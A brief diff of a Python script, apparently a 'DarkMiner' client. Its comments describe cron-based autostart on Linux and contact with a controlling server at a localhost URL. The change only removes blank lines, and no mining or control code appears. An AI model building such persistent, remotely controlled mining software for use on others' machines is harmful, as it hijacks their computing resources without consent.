@@ -3,7 +3,6 @@
 # Sets cron jobs for autostarting on linux
 # Installer works on Linux
 # Talks to a server
-
 import sys
 import platform
 import signal
@@ -13,7 +12,6 @@ import subprocess
 import configparser
 import multiprocessing
 import easygui
-
 #Website you are hosting the controlling server on
 BaseSite = 'http://localhost/DarkMiner/'
 
